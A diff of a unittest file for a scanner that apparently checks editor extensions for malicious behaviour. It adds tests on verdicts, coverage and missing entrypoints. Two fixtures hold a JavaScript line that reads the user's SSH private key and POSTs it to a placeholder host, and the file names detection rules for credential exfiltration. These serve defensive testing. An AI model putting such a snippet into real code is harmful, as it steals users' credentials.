@@ -121,7 +121,7 @@ class ScannerTests(unittest.TestCase):
         report = scan_targets(include_fixtures=True)
         bundle = build_report_bundle(report, profile="smart", source="fixtures")
 
-        self.assertEqual(bundle["metadata"]["schema_version"], "2.0")
+        self.assertEqual(bundle["metadata"]["schema_version"], "2.1")
         self.assertEqual(bundle["metadata"]["profile"], "smart")
         self.assertEqual(bundle["metadata"]["source"], "fixtures")
         self.assertEqual(bundle["summary"]["summary"]["total_extensions"], 8)
@@ -133,6 +133,9 @@ class ScannerTests(unittest.TestCase):
         self.assertTrue(all("detail_ref" in row for row in rows))
         suspicious = next(row for row in rows if row["extension_id"] == "unknown.shadow-helper")
         self.assertEqual(suspicious["grade"], "D")
+        self.assertEqual(suspicious["decision"], "review")
+        self.assertEqual(suspicious["coverage_percent"], 100)
+        self.assertEqual(len(suspicious["artifact_sha256"]), 64)
         self.assertIn("credential-exfiltration-chain", suspicious["top_findings"])
 
         detail = bundle["extensions"][suspicious["detail_ref"]]
@@ -906,9 +909,61 @@ class ScannerTests(unittest.TestCase):
 
             report = scan_extension(root)
 
-        self.assertNotEqual(report.verdict, "suspicious")
-        self.assertNotIn("download-and-execute", {finding.rule_id for finding in report.findings})
-        self.assertNotIn("credential-exfiltration-chain", {finding.rule_id for finding in report.findings})
+        self.assertEqual(report.verdict, "suspicious")
+        self.assertIn("obfuscation-execution-network", {finding.rule_id for finding in report.findings})
+        self.assertEqual(report.analysis_coverage["coverage_percent"], 100)
+
+    def test_declared_dist_entrypoint_is_never_silently_skipped(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "dist").mkdir()
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"dist-entry","version":"1.0.0","main":"dist/extension.js"}',
+                encoding="utf-8",
+            )
+            (root / "dist" / "extension.js").write_text(
+                "const fs=require('fs'); const key=fs.readFileSync(process.env.HOME+'/.ssh/id_rsa');"
+                "fetch('https://example.invalid',{method:'POST',body:key});",
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        self.assertEqual(report.verdict, "suspicious")
+        self.assertEqual(report.decision, "review")
+        self.assertIn("dist/extension.js", report.analysis_coverage["analyzed_executable_files"])
+
+    def test_executable_content_after_old_text_limit_is_analyzed(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"large-entry","version":"1.0.0","main":"extension.js"}',
+                encoding="utf-8",
+            )
+            payload = (
+                "const fs=require('fs'); const key=fs.readFileSync(process.env.HOME+'/.ssh/id_rsa');"
+                "fetch('https://example.invalid',{method:'POST',body:key});"
+            )
+            (root / "extension.js").write_text("const padding='x';\n" * 14_000 + payload, encoding="utf-8")
+
+            report = scan_extension(root)
+
+        self.assertEqual(report.verdict, "suspicious")
+        self.assertEqual(report.analysis_coverage["status"], "complete")
+
+    def test_missing_declared_entrypoint_is_incomplete_not_allow(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"missing-entry","version":"1.0.0","main":"dist/missing.js"}',
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        self.assertEqual(report.decision, "incomplete")
+        self.assertTrue(report.artifact_inventory["scan_incomplete"])
+        self.assertIn("dist/missing.js", report.analysis_coverage["missing_entrypoints"])
 
     def test_weak_standalone_static_indicator_stays_clean(self) -> None:
         with TemporaryDirectory() as tmp:
@@ -1029,12 +1084,8 @@ class ScannerTests(unittest.TestCase):
                 encoding="utf-8",
             )
 
-            observations = run_sandbox(root, allow_execute=True, timeout_seconds=5)
-
-        items = observations["extensions"]["example.runtime"]
-        self.assertIn("secret_read", {item["kind"] for item in items})
-        self.assertIn("unexpected_network", {item["kind"] for item in items})
-        self.assertIn("secret_exfil", {item["kind"] for item in items})
+            with self.assertRaisesRegex(ValueError, "OS-level"):
+                run_sandbox(root, allow_execute=True, timeout_seconds=5)
 
     def test_repo_binary_artifacts_metric_fires_for_committed_native_binary(self) -> None:
         with TemporaryDirectory() as tmp:
